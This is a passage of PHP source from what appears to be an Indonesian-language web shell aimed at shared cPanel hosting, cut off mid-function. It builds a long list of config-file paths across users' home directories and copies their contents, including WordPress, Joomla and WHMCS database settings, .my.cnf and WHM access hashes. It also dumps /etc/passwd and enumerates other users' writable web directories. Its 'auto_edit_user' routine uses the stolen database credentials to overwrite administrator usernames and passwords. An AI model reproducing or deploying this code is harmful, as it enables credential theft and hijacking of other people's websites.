                    "/home/$user_act/public_html/PRESS/configuration.php" => "JoomlaPress",
                    "/home/$user_act/public_html/Press/configuration.php" => "JoomlaPress",
                    "/home/$user_act/public_html/press/configuration.php" => "JoomlaPress",
                    "/home/$user_act/public_html/Wp/configuration.php" => "JoomlaWp",
                    "/home/$user_act/public_html/wp/configuration.php" => "JoomlaWp",
                    "/home/$user_act/public_html/WP/configuration.php" => "JoomlaWP",
                    "/home/$user_act/public_html/portal/configuration.php" => "JoomlaPortal",
                    "/home/$user_act/public_html/PORTAL/configuration.php" => "JoomlaPortal",
                    "/home/$user_act/public_html/Portal/configuration.php" => "JoomlaPortal",                   
                    "/home/$user_act/public_html/wp-config.php" => "WordPress",
                    "/home/$user_act/public_html/wordpress/wp-config.php" => "WordPressWordpress",
                    "/home/$user_act/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
                    "/home/$user_act/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",      
                    "/home/$user_act/public_html/Home/wp-config.php" => "WordPressHome",
                    "/home/$user_act/public_html/HOME/wp-config.php" => "WordPressHome",
                    "/home/$user_act/public_html/home/wp-config.php" => "WordPressHome",
                    "/home/$user_act/public_html/NEW/wp-config.php" => "WordPressNew",
                    "/home/$user_act/public_html/New/wp-config.php" => "WordPressNew",
                    "/home/$user_act/public_html/new/wp-config.php" => "WordPressNew",
                    "/home/$user_act/public_html/News/wp-config.php" => "WordPressNews",
                    "/home/$user_act/public_html/NEWS/wp-config.php" => "WordPressNews",
                    "/home/$user_act/public_html/news/wp-config.php" => "WordPressNews",
                    "/home/$user_act/public_html/Cms/wp-config.php" => "WordPressCms",
                    "/home/$user_act/public_html/CMS/wp-config.php" => "WordPressCms",
                    "/home/$user_act/public_html/cms/wp-config.php" => "WordPressCms",
                    "/home/$user_act/public_html/Main/wp-config.php" => "WordPressMain",
                    "/home/$user_act/public_html/MAIN/wp-config.php" => "WordPressMain",
                    "/home/$user_act/public_html/main/wp-config.php" => "WordPressMain",
                    "/home/$user_act/public_html/Blog/wp-config.php" => "WordPressBlog",
                    "/home/$user_act/public_html/BLOG/wp-config.php" => "WordPressBlog",
                    "/home/$user_act/public_html/blog/wp-config.php" => "WordPressBlog",
                    "/home/$user_act/public_html/Blogs/wp-config.php" => "WordPressBlogs",
                    "/home/$user_act/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
                    "/home/$user_act/public_html/blogs/wp-config.php" => "WordPressBlogs",
                    "/home/$user_act/public_html/beta/wp-config.php" => "WordPressBeta",
                    "/home/$user_act/public_html/Beta/wp-config.php" => "WordPressBeta",
                    "/home/$user_act/public_html/BETA/wp-config.php" => "WordPressBeta",
                    "/home/$user_act/public_html/PRESS/wp-config.php" => "WordPressPress",
                    "/home/$user_act/public_html/Press/wp-config.php" => "WordPressPress",
                    "/home/$user_act/public_html/press/wp-config.php" => "WordPressPress",
                    "/home/$user_act/public_html/Wp/wp-config.php" => "WordPressWp",
                    "/home/$user_act/public_html/wp/wp-config.php" => "WordPressWp",
                    "/home/$user_act/public_html/WP/wp-config.php" => "WordPressWP",
                    "/home/$user_act/public_html/portal/wp-config.php" => "WordPressPortal",
                    "/home/$user_act/public_html/PORTAL/wp-config.php" => "WordPressPortal",
                    "/home/$user_act/public_html/Portal/wp-config.php" => "WordPressPortal",
                                        "/home1/$user_act/.my.cnf" => "cpanel",
                    "/home1/$user_act/.accesshash" => "WHM-accesshash",
                    "/home1/$user_act/public_html/bw-configs/config.ini" => "BosWeb",
                    "/home1/$user_act/public_html/config/koneksi.php" => "Lokomedia",
                    "/home1/$user_act/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                    "/home1/$user_act/public_html/clientarea/configuration.php" => "WHMCS",             
                    "/home1/$user_act/public_html/whmcs/configuration.php" => "WHMCS",
                    "/home1/$user_act/public_html/forum/config.php" => "phpBB",
                    "/home1/$user_act/public_html/sites/default/settings.php" => "Drupal",
                    "/home1/$user_act/public_html/config/settings.inc.php" => "PrestaShop",
                    "/home1/$user_act/public_html/app/etc/local.xml" => "Magento",
                    "/home1/$user_act/public_html/admin/config.php" => "OpenCart",
                    "/home1/$user_act/public_html/slconfig.php" => "Sitelok",
                    "/home1/$user_act/public_html/application/config/database.php" => "Ellislab",                   
                    "/home1/$user_act/public_html/whm/configuration.php" => "WHMCS",
                    "/home1/$user_act/public_html/whmc/WHM/configuration.ph" => "WHMC",
                    "/home1/$user_act/public_html/central/configuration.php" => "WHM Central",
                    "/home1/$user_act/public_html/whm/WHMCS/configuration.php" => "WHMCS",
                    "/home1/$user_act/public_html/whm/whmcs/configuration.php" => "WHMCS",
                    "/home1/$user_act/public_html/submitticket.php" => "WHMCS",                                     
                    "/home1/$user_act/public_html/configuration.php" => "Joomla",                   
                    "/home1/$user_act/public_html/Joomla/configuration.php" => "JoomlaJoomla",
                    "/home1/$user_act/public_html/joomla/configuration.php" => "JoomlaJoomla",
                    "/home1/$user_act/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",      
                    "/home1/$user_act/public_html/Home/configuration.php" => "JoomlaHome",
                    "/home1/$user_act/public_html/HOME/configuration.php" => "JoomlaHome",
                    "/home1/$user_act/public_html/home/configuration.php" => "JoomlaHome",
                    "/home1/$user_act/public_html/NEW/configuration.php" => "JoomlaNew",
                    "/home1/$user_act/public_html/New/configuration.php" => "JoomlaNew",
                    "/home1/$user_act/public_html/new/configuration.php" => "JoomlaNew",
                    "/home1/$user_act/public_html/News/configuration.php" => "JoomlaNews",
                    "/home1/$user_act/public_html/NEWS/configuration.php" => "JoomlaNews",
                    "/home1/$user_act/public_html/news/configuration.php" => "JoomlaNews",
                    "/home1/$user_act/public_html/Cms/configuration.php" => "JoomlaCms",
                    "/home1/$user_act/public_html/CMS/configuration.php" => "JoomlaCms",
                    "/home1/$user_act/public_html/cms/configuration.php" => "JoomlaCms",
                    "/home1/$user_act/public_html/Main/configuration.php" => "JoomlaMain",
                    "/home1/$user_act/public_html/MAIN/configuration.php" => "JoomlaMain",
                    "/home1/$user_act/public_html/main/configuration.php" => "JoomlaMain",
                    "/home1/$user_act/public_html/Blog/configuration.php" => "JoomlaBlog",
                    "/home1/$user_act/public_html/BLOG/configuration.php" => "JoomlaBlog",
                    "/home1/$user_act/public_html/blog/configuration.php" => "JoomlaBlog",
                    "/home1/$user_act/public_html/Blogs/configuration.php" => "JoomlaBlogs",
                    "/home1/$user_act/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
                    "/home1/$user_act/public_html/blogs/configuration.php" => "JoomlaBlogs",
                    "/home1/$user_act/public_html/beta/configuration.php" => "JoomlaBeta",
                    "/home1/$user_act/public_html/Beta/configuration.php" => "JoomlaBeta",
                    "/home1/$user_act/public_html/BETA/configuration.php" => "JoomlaBeta",
                    "/home1/$user_act/public_html/PRESS/configuration.php" => "JoomlaPress",
                    "/home1/$user_act/public_html/Press/configuration.php" => "JoomlaPress",
                    "/home1/$user_act/public_html/press/configuration.php" => "JoomlaPress",
                    "/home1/$user_act/public_html/Wp/configuration.php" => "JoomlaWp",
                    "/home1/$user_act/public_html/wp/configuration.php" => "JoomlaWp",
                    "/home1/$user_act/public_html/WP/configuration.php" => "JoomlaWP",
                    "/home1/$user_act/public_html/portal/configuration.php" => "JoomlaPortal",
                    "/home1/$user_act/public_html/PORTAL/configuration.php" => "JoomlaPortal",
                    "/home1/$user_act/public_html/Portal/configuration.php" => "JoomlaPortal",                  
                    "/home1/$user_act/public_html/wp-config.php" => "WordPress",
                    "/home1/$user_act/public_html/wordpress/wp-config.php" => "WordPressWordpress",
                    "/home1/$user_act/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
                    "/home1/$user_act/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",     
                    "/home1/$user_act/public_html/Home/wp-config.php" => "WordPressHome",
                    "/home1/$user_act/public_html/HOME/wp-config.php" => "WordPressHome",
                    "/home1/$user_act/public_html/home/wp-config.php" => "WordPressHome",
                    "/home1/$user_act/public_html/NEW/wp-config.php" => "WordPressNew",
                    "/home1/$user_act/public_html/New/wp-config.php" => "WordPressNew",
                    "/home1/$user_act/public_html/new/wp-config.php" => "WordPressNew",
                    "/home1/$user_act/public_html/News/wp-config.php" => "WordPressNews",
                    "/home1/$user_act/public_html/NEWS/wp-config.php" => "WordPressNews",
                    "/home1/$user_act/public_html/news/wp-config.php" => "WordPressNews",
                    "/home1/$user_act/public_html/Cms/wp-config.php" => "WordPressCms",
                    "/home1/$user_act/public_html/CMS/wp-config.php" => "WordPressCms",
                    "/home1/$user_act/public_html/cms/wp-config.php" => "WordPressCms",
                    "/home1/$user_act/public_html/Main/wp-config.php" => "WordPressMain",
                    "/home1/$user_act/public_html/MAIN/wp-config.php" => "WordPressMain",
                    "/home1/$user_act/public_html/main/wp-config.php" => "WordPressMain",
                    "/home1/$user_act/public_html/Blog/wp-config.php" => "WordPressBlog",
                    "/home1/$user_act/public_html/BLOG/wp-config.php" => "WordPressBlog",
                    "/home1/$user_act/public_html/blog/wp-config.php" => "WordPressBlog",
                    "/home1/$user_act/public_html/Blogs/wp-config.php" => "WordPressBlogs",
                    "/home1/$user_act/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
                    "/home1/$user_act/public_html/blogs/wp-config.php" => "WordPressBlogs",
                    "/home1/$user_act/public_html/beta/wp-config.php" => "WordPressBeta",
                    "/home1/$user_act/public_html/Beta/wp-config.php" => "WordPressBeta",
                    "/home1/$user_act/public_html/BETA/wp-config.php" => "WordPressBeta",
                    "/home1/$user_act/public_html/PRESS/wp-config.php" => "WordPressPress",
                    "/home1/$user_act/public_html/Press/wp-config.php" => "WordPressPress",
                    "/home1/$user_act/public_html/press/wp-config.php" => "WordPressPress",
                    "/home1/$user_act/public_html/Wp/wp-config.php" => "WordPressWp",
                    "/home1/$user_act/public_html/wp/wp-config.php" => "WordPressWp",
                    "/home1/$user_act/public_html/WP/wp-config.php" => "WordPressWP",
                    "/home1/$user_act/public_html/portal/wp-config.php" => "WordPressPortal",
                    "/home1/$user_act/public_html/PORTAL/wp-config.php" => "WordPressPortal",
                    "/home1/$user_act/public_html/Portal/wp-config.php" => "WordPressPortal",
                                        "/home2/$user_act/.my.cnf" => "cpanel",
                    "/home2/$user_act/.accesshash" => "WHM-accesshash",
                    "/home2/$user_act/public_html/bw-configs/config.ini" => "BosWeb",
                    "/home2/$user_act/public_html/config/koneksi.php" => "Lokomedia",
                    "/home2/$user_act/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                    "/home2/$user_act/public_html/clientarea/configuration.php" => "WHMCS",             
                    "/home2/$user_act/public_html/whmcs/configuration.php" => "WHMCS",
                    "/home2/$user_act/public_html/forum/config.php" => "phpBB",
                    "/home2/$user_act/public_html/sites/default/settings.php" => "Drupal",
                    "/home2/$user_act/public_html/config/settings.inc.php" => "PrestaShop",
                    "/home2/$user_act/public_html/app/etc/local.xml" => "Magento",
                    "/home2/$user_act/public_html/admin/config.php" => "OpenCart",
                    "/home2/$user_act/public_html/slconfig.php" => "Sitelok",
                    "/home2/$user_act/public_html/application/config/database.php" => "Ellislab",                   
                    "/home2/$user_act/public_html/whm/configuration.php" => "WHMCS",
                    "/home2/$user_act/public_html/whmc/WHM/configuration.ph" => "WHMC",
                    "/home2/$user_act/public_html/central/configuration.php" => "WHM Central",
                    "/home2/$user_act/public_html/whm/WHMCS/configuration.php" => "WHMCS",
                    "/home2/$user_act/public_html/whm/whmcs/configuration.php" => "WHMCS",
                    "/home2/$user_act/public_html/submitticket.php" => "WHMCS",                                     
                    "/home2/$user_act/public_html/configuration.php" => "Joomla",                   
                    "/home2/$user_act/public_html/Joomla/configuration.php" => "JoomlaJoomla",
                    "/home2/$user_act/public_html/joomla/configuration.php" => "JoomlaJoomla",
                    "/home2/$user_act/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",      
                    "/home2/$user_act/public_html/Home/configuration.php" => "JoomlaHome",
                    "/home2/$user_act/public_html/HOME/configuration.php" => "JoomlaHome",
                    "/home2/$user_act/public_html/home/configuration.php" => "JoomlaHome",
                    "/home2/$user_act/public_html/NEW/configuration.php" => "JoomlaNew",
                    "/home2/$user_act/public_html/New/configuration.php" => "JoomlaNew",
                    "/home2/$user_act/public_html/new/configuration.php" => "JoomlaNew",
                    "/home2/$user_act/public_html/News/configuration.php" => "JoomlaNews",
                    "/home2/$user_act/public_html/NEWS/configuration.php" => "JoomlaNews",
                    "/home2/$user_act/public_html/news/configuration.php" => "JoomlaNews",
                    "/home2/$user_act/public_html/Cms/configuration.php" => "JoomlaCms",
                    "/home2/$user_act/public_html/CMS/configuration.php" => "JoomlaCms",
                    "/home2/$user_act/public_html/cms/configuration.php" => "JoomlaCms",
                    "/home2/$user_act/public_html/Main/configuration.php" => "JoomlaMain",
                    "/home2/$user_act/public_html/MAIN/configuration.php" => "JoomlaMain",
                    "/home2/$user_act/public_html/main/configuration.php" => "JoomlaMain",
                    "/home2/$user_act/public_html/Blog/configuration.php" => "JoomlaBlog",
                    "/home2/$user_act/public_html/BLOG/configuration.php" => "JoomlaBlog",
                    "/home2/$user_act/public_html/blog/configuration.php" => "JoomlaBlog",
                    "/home2/$user_act/public_html/Blogs/configuration.php" => "JoomlaBlogs",
                    "/home2/$user_act/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
                    "/home2/$user_act/public_html/blogs/configuration.php" => "JoomlaBlogs",
                    "/home2/$user_act/public_html/beta/configuration.php" => "JoomlaBeta",
                    "/home2/$user_act/public_html/Beta/configuration.php" => "JoomlaBeta",
                    "/home2/$user_act/public_html/BETA/configuration.php" => "JoomlaBeta",
                    "/home2/$user_act/public_html/PRESS/configuration.php" => "JoomlaPress",
                    "/home2/$user_act/public_html/Press/configuration.php" => "JoomlaPress",
                    "/home2/$user_act/public_html/press/configuration.php" => "JoomlaPress",
                    "/home2/$user_act/public_html/Wp/configuration.php" => "JoomlaWp",
                    "/home2/$user_act/public_html/wp/configuration.php" => "JoomlaWp",
                    "/home2/$user_act/public_html/WP/configuration.php" => "JoomlaWP",
                    "/home2/$user_act/public_html/portal/configuration.php" => "JoomlaPortal",
                    "/home2/$user_act/public_html/PORTAL/configuration.php" => "JoomlaPortal",
                    "/home2/$user_act/public_html/Portal/configuration.php" => "JoomlaPortal",                  
                    "/home2/$user_act/public_html/wp-config.php" => "WordPress",
                    "/home2/$user_act/public_html/wordpress/wp-config.php" => "WordPressWordpress",
                    "/home2/$user_act/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
                    "/home2/$user_act/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",     
                    "/home2/$user_act/public_html/Home/wp-config.php" => "WordPressHome",
                    "/home2/$user_act/public_html/HOME/wp-config.php" => "WordPressHome",
                    "/home2/$user_act/public_html/home/wp-config.php" => "WordPressHome",
                    "/home2/$user_act/public_html/NEW/wp-config.php" => "WordPressNew",
                    "/home2/$user_act/public_html/New/wp-config.php" => "WordPressNew",
                    "/home2/$user_act/public_html/new/wp-config.php" => "WordPressNew",
                    "/home2/$user_act/public_html/News/wp-config.php" => "WordPressNews",
                    "/home2/$user_act/public_html/NEWS/wp-config.php" => "WordPressNews",
                    "/home2/$user_act/public_html/news/wp-config.php" => "WordPressNews",
                    "/home2/$user_act/public_html/Cms/wp-config.php" => "WordPressCms",
                    "/home2/$user_act/public_html/CMS/wp-config.php" => "WordPressCms",
                    "/home2/$user_act/public_html/cms/wp-config.php" => "WordPressCms",
                    "/home2/$user_act/public_html/Main/wp-config.php" => "WordPressMain",
                    "/home2/$user_act/public_html/MAIN/wp-config.php" => "WordPressMain",
                    "/home2/$user_act/public_html/main/wp-config.php" => "WordPressMain",
                    "/home2/$user_act/public_html/Blog/wp-config.php" => "WordPressBlog",
                    "/home2/$user_act/public_html/BLOG/wp-config.php" => "WordPressBlog",
                    "/home2/$user_act/public_html/blog/wp-config.php" => "WordPressBlog",
                    "/home2/$user_act/public_html/Blogs/wp-config.php" => "WordPressBlogs",
                    "/home2/$user_act/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
                    "/home2/$user_act/public_html/blogs/wp-config.php" => "WordPressBlogs",
                    "/home2/$user_act/public_html/beta/wp-config.php" => "WordPressBeta",
                    "/home2/$user_act/public_html/Beta/wp-config.php" => "WordPressBeta",
                    "/home2/$user_act/public_html/BETA/wp-config.php" => "WordPressBeta",
                    "/home2/$user_act/public_html/PRESS/wp-config.php" => "WordPressPress",
                    "/home2/$user_act/public_html/Press/wp-config.php" => "WordPressPress",
                    "/home2/$user_act/public_html/press/wp-config.php" => "WordPressPress",
                    "/home2/$user_act/public_html/Wp/wp-config.php" => "WordPressWp",
                    "/home2/$user_act/public_html/wp/wp-config.php" => "WordPressWp",
                    "/home2/$user_act/public_html/WP/wp-config.php" => "WordPressWP",
                    "/home2/$user_act/public_html/portal/wp-config.php" => "WordPressPortal",
                    "/home2/$user_act/public_html/PORTAL/wp-config.php" => "WordPressPortal",
                    "/home2/$user_act/public_html/Portal/wp-config.php" => "WordPressPortal",
                    "/home3/$user_act/.my.cnf" => "cpanel",
                    "/home3/$user_act/.accesshash" => "WHM-accesshash",
                    "/home3/$user_act/public_html/bw-configs/config.ini" => "BosWeb",
                    "/home3/$user_act/public_html/config/koneksi.php" => "Lokomedia",
                    "/home3/$user_act/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                    "/home3/$user_act/public_html/clientarea/configuration.php" => "WHMCS",             
                    "/home3/$user_act/public_html/whmcs/configuration.php" => "WHMCS",
                    "/home3/$user_act/public_html/forum/config.php" => "phpBB",
                    "/home3/$user_act/public_html/sites/default/settings.php" => "Drupal",
                    "/home3/$user_act/public_html/config/settings.inc.php" => "PrestaShop",
                    "/home3/$user_act/public_html/app/etc/local.xml" => "Magento",
                    "/home3/$user_act/public_html/admin/config.php" => "OpenCart",
                    "/home3/$user_act/public_html/slconfig.php" => "Sitelok",
                    "/home3/$user_act/public_html/application/config/database.php" => "Ellislab",                   
                    "/home3/$user_act/public_html/whm/configuration.php" => "WHMCS",
                    "/home3/$user_act/public_html/whmc/WHM/configuration.ph" => "WHMC",
                    "/home3/$user_act/public_html/central/configuration.php" => "WHM Central",
                    "/home3/$user_act/public_html/whm/WHMCS/configuration.php" => "WHMCS",
                    "/home3/$user_act/public_html/whm/whmcs/configuration.php" => "WHMCS",
                    "/home3/$user_act/public_html/submitticket.php" => "WHMCS",                                     
                    "/home3/$user_act/public_html/configuration.php" => "Joomla",                   
                    "/home3/$user_act/public_html/Joomla/configuration.php" => "JoomlaJoomla",
                    "/home3/$user_act/public_html/joomla/configuration.php" => "JoomlaJoomla",
                    "/home3/$user_act/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",      
                    "/home3/$user_act/public_html/Home/configuration.php" => "JoomlaHome",
                    "/home3/$user_act/public_html/HOME/configuration.php" => "JoomlaHome",
                    "/home3/$user_act/public_html/home/configuration.php" => "JoomlaHome",
                    "/home3/$user_act/public_html/NEW/configuration.php" => "JoomlaNew",
                    "/home3/$user_act/public_html/New/configuration.php" => "JoomlaNew",
                    "/home3/$user_act/public_html/new/configuration.php" => "JoomlaNew",
                    "/home3/$user_act/public_html/News/configuration.php" => "JoomlaNews",
                    "/home3/$user_act/public_html/NEWS/configuration.php" => "JoomlaNews",
                    "/home3/$user_act/public_html/news/configuration.php" => "JoomlaNews",
                    "/home3/$user_act/public_html/Cms/configuration.php" => "JoomlaCms",
                    "/home3/$user_act/public_html/CMS/configuration.php" => "JoomlaCms",
                    "/home3/$user_act/public_html/cms/configuration.php" => "JoomlaCms",
                    "/home3/$user_act/public_html/Main/configuration.php" => "JoomlaMain",
                    "/home3/$user_act/public_html/MAIN/configuration.php" => "JoomlaMain",
                    "/home3/$user_act/public_html/main/configuration.php" => "JoomlaMain",
                    "/home3/$user_act/public_html/Blog/configuration.php" => "JoomlaBlog",
                    "/home3/$user_act/public_html/BLOG/configuration.php" => "JoomlaBlog",
                    "/home3/$user_act/public_html/blog/configuration.php" => "JoomlaBlog",
                    "/home3/$user_act/public_html/Blogs/configuration.php" => "JoomlaBlogs",
                    "/home3/$user_act/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
                    "/home3/$user_act/public_html/blogs/configuration.php" => "JoomlaBlogs",
                    "/home3/$user_act/public_html/beta/configuration.php" => "JoomlaBeta",
                    "/home3/$user_act/public_html/Beta/configuration.php" => "JoomlaBeta",
                    "/home3/$user_act/public_html/BETA/configuration.php" => "JoomlaBeta",
                    "/home3/$user_act/public_html/PRESS/configuration.php" => "JoomlaPress",
                    "/home3/$user_act/public_html/Press/configuration.php" => "JoomlaPress",
                    "/home3/$user_act/public_html/press/configuration.php" => "JoomlaPress",
                    "/home3/$user_act/public_html/Wp/configuration.php" => "JoomlaWp",
                    "/home3/$user_act/public_html/wp/configuration.php" => "JoomlaWp",
                    "/home3/$user_act/public_html/WP/configuration.php" => "JoomlaWP",
                    "/home3/$user_act/public_html/portal/configuration.php" => "JoomlaPortal",
                    "/home3/$user_act/public_html/PORTAL/configuration.php" => "JoomlaPortal",
                    "/home3/$user_act/public_html/Portal/configuration.php" => "JoomlaPortal",                  
                    "/home3/$user_act/public_html/wp-config.php" => "WordPress",
                    "/home3/$user_act/public_html/wordpress/wp-config.php" => "WordPressWordpress",
                    "/home3/$user_act/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
                    "/home3/$user_act/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",     
                    "/home3/$user_act/public_html/Home/wp-config.php" => "WordPressHome",
                    "/home3/$user_act/public_html/HOME/wp-config.php" => "WordPressHome",
                    "/home3/$user_act/public_html/home/wp-config.php" => "WordPressHome",
                    "/home3/$user_act/public_html/NEW/wp-config.php" => "WordPressNew",
                    "/home3/$user_act/public_html/New/wp-config.php" => "WordPressNew",
                    "/home3/$user_act/public_html/new/wp-config.php" => "WordPressNew",
                    "/home3/$user_act/public_html/News/wp-config.php" => "WordPressNews",
                    "/home3/$user_act/public_html/NEWS/wp-config.php" => "WordPressNews",
                    "/home3/$user_act/public_html/news/wp-config.php" => "WordPressNews",
                    "/home3/$user_act/public_html/Cms/wp-config.php" => "WordPressCms",
                    "/home3/$user_act/public_html/CMS/wp-config.php" => "WordPressCms",
                    "/home3/$user_act/public_html/cms/wp-config.php" => "WordPressCms",
                    "/home3/$user_act/public_html/Main/wp-config.php" => "WordPressMain",
                    "/home3/$user_act/public_html/MAIN/wp-config.php" => "WordPressMain",
                    "/home3/$user_act/public_html/main/wp-config.php" => "WordPressMain",
                    "/home3/$user_act/public_html/Blog/wp-config.php" => "WordPressBlog",
                    "/home3/$user_act/public_html/BLOG/wp-config.php" => "WordPressBlog",
                    "/home3/$user_act/public_html/blog/wp-config.php" => "WordPressBlog",
                    "/home3/$user_act/public_html/Blogs/wp-config.php" => "WordPressBlogs",
                    "/home3/$user_act/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
                    "/home3/$user_act/public_html/blogs/wp-config.php" => "WordPressBlogs",
                    "/home3/$user_act/public_html/beta/wp-config.php" => "WordPressBeta",
                    "/home3/$user_act/public_html/Beta/wp-config.php" => "WordPressBeta",
                    "/home3/$user_act/public_html/BETA/wp-config.php" => "WordPressBeta",
                    "/home3/$user_act/public_html/PRESS/wp-config.php" => "WordPressPress",
                    "/home3/$user_act/public_html/Press/wp-config.php" => "WordPressPress",
                    "/home3/$user_act/public_html/press/wp-config.php" => "WordPressPress",
                    "/home3/$user_act/public_html/Wp/wp-config.php" => "WordPressWp",
                    "/home3/$user_act/public_html/wp/wp-config.php" => "WordPressWp",
                    "/home3/$user_act/public_html/WP/wp-config.php" => "WordPressWP",
                    "/home3/$user_act/public_html/portal/wp-config.php" => "WordPressPortal",
                    "/home3/$user_act/public_html/PORTAL/wp-config.php" => "WordPressPortal",
                    "/home3/$user_act/public_html/Portal/wp-config.php" => "WordPressPortal"                    
                        );  
                    foreach($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if($ambil_config == '') {
                        } else {
                            $file_config = fopen("act_config/$user_act-$nama_config.txt","w");
                            fputs($file_config,$ambil_config);
                        }
                    }
                }       
            }
            echo "<center><a href='?dir=$dir/act_config'><font color=#FDF105>Done</font></a></center>";
            }else{
                
        echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo file_get_contents('/etc/passwd'); 
        echo "</textarea><br><input type=\"submit\" value=\"Tembak Sekarang!!!\"></td></tr></center>\n";
        }
} elseif($_GET['do'] == 'jumping') {
    $i = 0;
    echo "<pre><div class='margin: 5px auto;'>";
    $etc = fopen("/etc/passwd", "r");
    while($passwd = fgets($etc)) {
        if($passwd == '' || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
            foreach($user_jumping[1] as $user_idx_jump) {
                $user_jumping_dir = "/home/$user_idx_jump/public_html";
                if(is_readable($user_jumping_dir)) {
                    $i++;
                    $jrw = "[<font color=yelloow>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
                    if(is_writable($user_jumping_dir)) {
                        $jrw = "[<font color=#FDF105>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
                    }
                    echo $jrw;
                    $domain_jump = file_get_contents("/etc/named.conf");    
                    if($domain_jump == '') {
                        echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                    } else {
                        preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                        foreach($domains_jump[1] as $dj) {
                            $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                            $user_jumping_url = $user_jumping_url['name'];
                            if($user_jumping_url == $user_idx_jump) {
                                echo " => ( <u>$dj</u> )<br>";
                                break;
                            }
                        }
                    }
                }
            }
        }
    }
    if($i == 0) { 
    } else {
        echo "<br>Total ada ".$i." Kimcil di ".gethostbyname($_SERVER['HTTP_HOST'])."";
    }
    echo "</div></pre>";
} elseif($_GET['do'] == 'auto_edit_user') {
    if($_POST['hajar']) {
        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
            echo "username atau password harus lebih dari 6 karakter";
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/JConfig|joomla/",$config)) {
                    $dbhost = ambilkata($config,"host = '","'");
                    $dbuser = ambilkata($config,"user = '","'");
                    $dbpass = ambilkata($config,"password = '","'");
                    $dbname = ambilkata($config,"db = '","'");
                    $dbprefix = ambilkata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config,"sitename = '","'");
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=#FDF105>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/WordPress/",$config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Wordpress<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=#FDF105>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                    $prefix = $dbprefix."admin_user";
                    $option = $dbprefix."core_config_data";
